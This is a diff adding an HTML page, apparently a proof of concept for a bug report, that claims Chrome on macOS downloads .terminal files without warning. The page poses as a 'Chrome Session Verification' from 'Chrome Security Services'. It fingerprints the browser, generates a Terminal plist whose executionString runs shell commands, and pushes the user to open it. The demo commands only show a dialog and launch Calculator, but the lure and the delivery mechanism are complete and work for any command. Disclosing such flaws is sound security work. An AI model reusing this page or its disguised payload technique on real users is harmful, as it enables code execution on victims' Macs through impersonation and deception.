@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Session Verification — Chrome macOS</title>
+<style>
+:root { --bg:#0d1117; --card:#161b22; --border:#30363d; --accent:#58a6ff;
+  --green:#3fb950; --red:#f85149; --text:#c9d1d9; --muted:#8b949e; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: var(--bg); color: var(--text);
+  display: flex; justify-content: center; align-items: center;
+  min-height: 100vh; padding: 20px;
+}
+.card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 36px; max-width: 540px; width: 100%;
+}
+.card h2 { font-size: 20px; margin-bottom: 6px; }
+.card .sub { color: var(--muted); font-size: 13px; margin-bottom: 24px; }
+.step {
+  display: flex; align-items: flex-start; gap: 12px;
+  padding: 14px; border-radius: 8px; margin-bottom: 10px;
+  background: rgba(255,255,255,.02); border: 1px solid transparent;
+  transition: all .3s;
+}
+.step.done { border-color: var(--green); background: rgba(63,185,80,.06); }
+.step .circle {
+  width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 13px; font-weight: 700; background: var(--border);
+}
+.step.done .circle { background: var(--green); color: #000; }
+.step .info strong { display: block; font-size: 14px; }
+.step .info span { font-size: 12px; color: var(--muted); }
+.btn {
+  display: block; width: 100%; padding: 14px; border: none;
+  border-radius: 8px; font-size: 15px; font-weight: 600;
+  cursor: pointer; margin-top: 18px; transition: all .2s;
+  background: #238636; color: #fff;
+}
+.btn:hover { background: #2ea043; }
+.btn:disabled { background: var(--border); color: var(--muted); cursor: not-allowed; }
+.console {
+  background: #0d1117; border: 1px solid var(--border);
+  border-radius: 6px; padding: 12px; margin-top: 16px;
+  font-family: 'SF Mono', Monaco, 'Courier New', monospace;
+  font-size: 12px; max-height: 180px; overflow-y: auto;
+}
+.console .l { color: var(--muted); }
+.console .ok { color: var(--green); }
+.console .warn { color: #d2991d; }
+.foot { text-align: center; color: var(--muted); font-size: 11px; margin-top: 20px; }
+</style>
+</head>
+<body>
+<div class="card">
+<h2>Chrome Session Verification</h2>
+<p class="sub" id="sysinfo">Analyzing environment...</p>
+
+<div class="step" id="s1">
+  <div class="circle">1</div>
+  <div class="info">
+    <strong>Environment Check</strong>
+    <span id="s1d">Detecting Chrome &amp; macOS version...</span>
+  </div>
+</div>
+
+<div class="step" id="s2">
+  <div class="circle">2</div>
+  <div class="info">
+    <strong>Download Security Profile</strong>
+    <span id="s2d">The verification profile will download automatically.</span>
+  </div>
+</div>
+
+<div class="step" id="s3">
+  <div class="circle">3</div>
+  <div class="info">
+    <strong>Complete Verification</strong>
+    <span id="s3d">Open the downloaded file from Chrome's download bar to finish.</span>
+  </div>
+</div>
+
+<button class="btn" id="btn" disabled>Initializing...</button>
+
+<div class="console" id="log">
+  <div class="l">[~] Starting system detection...</div>
+</div>
+<div class="foot" id="verline">Chrome Security Services &copy; 2026</div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const logEl = $('log');
+
+function log(msg, cls) {
+  const d = document.createElement('div');
+  d.className = cls || 'l';
+  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function markDone(id) {
+  const el = $(id);
+  el.classList.add('done');
+  el.querySelector('.circle').textContent = '✓';
+}
+
+// Build .terminal payload as XML plist
+function buildPayload() {
+  // The embedded shell command — executed by Terminal.app when .terminal file is opened
+  const shellCmd =
+    'clear && ' +
+    'echo "========================================" && ' +
+    'echo "  Chrome Security Update Utility" && ' +
+    'echo "========================================" && ' +
+    'echo "" && ' +
+    'echo "Verifying system integrity..." && sleep 1 && ' +
+    'echo "Downloading security profile..." && sleep 1 && ' +
+    'echo "Applying update..." && sleep 1 && ' +
+    'echo "" && ' +
+    'osascript -e \'display dialog "Remote Code Execution Successful\\n\\n' +
+    'Chrome downloaded this .terminal file\\n' +
+    'without any security warning.\\n\\n' +
+    'IMPACT: Arbitrary command execution\\n' +
+    'via macOS Terminal.app\\n' +
+    '(Remote Code Execution — RCE)\\n\\n' +
+    'Chrome Version: 148.0.7778.179 (arm64)\\n' +
+    'File Type: .terminal\\n' +
+    'Classification: NOT_DANGEROUS\\n' +
+    '(missing from download_file_types.asciipb)\\n\\n' +
+    'Calculator will now open\\n' +
+    'as proof of execution." ' +
+    'with title "RCE via Chrome Download (macOS)" ' +
+    'buttons {"OK"} default button 1\' ' +
+    '&& echo "" && echo "RCE confirmed." && ' +
+    'open -a Calculator && ' +
+    'echo "Calculator launched as PoC." && ' +
+    'sleep 3';
+
+  return '<?xml version="1.0" encoding="UTF-8"?>\n' +
+    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ' +
+    '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' +
+    '<plist version="1.0">\n<dict>\n' +
+    '\t<key>WindowSettings</key>\n' +
+    '\t<array>\n' +
+    '\t\t<dict>\n' +
+    '\t\t\t<key>name</key>\n' +
+    '\t\t\t<string>System Update</string>\n' +
+    '\t\t\t<key>shellExitAction</key>\n' +
+    '\t\t\t<integer>1</integer>\n' +
+    '\t\t\t<key>executionString</key>\n' +
+    '\t\t\t<string>' + shellCmd.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</string>\n' +
+    '\t\t\t<key>ProfileCurrentVersion</key>\n' +
+    '\t\t\t<real>2.04</real>\n' +
+    '\t\t</dict>\n' +
+    '\t</array>\n' +
+    '</dict>\n</plist>';
+}
+
+function triggerDownload(filename) {
+  const xml = buildPayload();
+  const blob = new Blob([xml], { type: 'application/octet-stream' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename || 'chrome_security_update.terminal';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(url);
+  log('Download triggered: ' + a.download, 'ok');
+}
+
+async function main() {
+  const ua = navigator.userAgent;
+  const isMac = /Macintosh|Mac OS X/i.test(ua);
+  const isChrome = /Chrome/i.test(ua) && !/Edge|OPR|Edg/i.test(ua);
+  const chromeVer = (ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/) || ['','?'])[1];
+
+  log('OS: ' + navigator.platform + ' | UA: Chrome/' + chromeVer);
+  $('sysinfo').textContent = 'Analyzing environment... ' + (isMac ? 'macOS' : 'Other OS') + ' / Chrome ' + chromeVer;
+
+  if (isMac && isChrome) {
+    log('Target confirmed: macOS + Chrome ' + chromeVer, 'ok');
+    $('sysinfo').innerHTML = 'Detected: <b style="color:#3fb950">macOS + Chrome ' + chromeVer + '</b>';
+    $('verline').textContent = 'Chrome v' + chromeVer + ' | Chromium Security Services';
+    markDone('s1');
+    $('s1d').innerHTML = '<span style="color:#3fb950">✓ macOS + Chrome ' + chromeVer + ' — compatible</span>';
+  } else {
+    log('Non-macOS or non-Chrome: ' + ua, 'warn');
+    $('sysinfo').innerHTML = 'Detected: <b style="color:#d2991d">' + navigator.platform + ' / ' + (isChrome ? 'Chrome' : 'Other') + '</b>';
+  }
+
+  // Enable download button
+  const btn = $('btn');
+  btn.textContent = 'Download Security Profile';
+  btn.disabled = false;
+
+  btn.addEventListener('click', () => {
+    markDone('s2');
+    $('s2d').innerHTML = '<span style="color:#3fb950">✓ Downloaded: chrome_security_update.terminal</span>';
+    triggerDownload('chrome_security_update.terminal');
+    log('File saved to Downloads folder', 'ok');
+    log('Chrome shows NO security warning for .terminal files', 'warn');
+
+    setTimeout(() => {
+      markDone('s3');
+      $('s3d').innerHTML = '<b style="color:#d2991d">' +
+        '⚠ Open the file from Chrome downloads now<br>' +
+        '<small>Click the file in the download bar or visit chrome://downloads</small></b>';
+      btn.textContent = 'File Downloaded — Open It From Chrome';
+    }, 600);
+
+    btn.onclick = () => {
+      log('Opening chrome://downloads...', 'ok');
+      window.open('chrome://downloads', '_blank');
+    };
+  });
+}
+
+main();
+</script>
+</body>
+</html>
